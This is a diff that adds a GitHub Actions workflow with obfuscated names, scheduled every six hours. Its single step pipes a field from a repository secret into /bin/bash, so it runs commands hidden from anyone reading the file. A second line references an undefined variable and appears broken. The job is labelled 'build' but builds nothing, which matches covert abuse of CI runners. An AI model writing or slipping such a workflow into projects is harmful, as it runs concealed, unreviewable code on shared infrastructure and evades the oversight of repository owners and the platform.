@@ -1,0 +1,19 @@
+name: shayinluo2345
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shayinluo2345
+        env:
+          ewuez0: ${{ secrets.ewuez0 }}
+        run: |
+          echo $ewuez0 | jq -r .rsd0906 | /bin/bash
+          echo $whmhh343 | jq -r .dws72 | /bin/bash
+
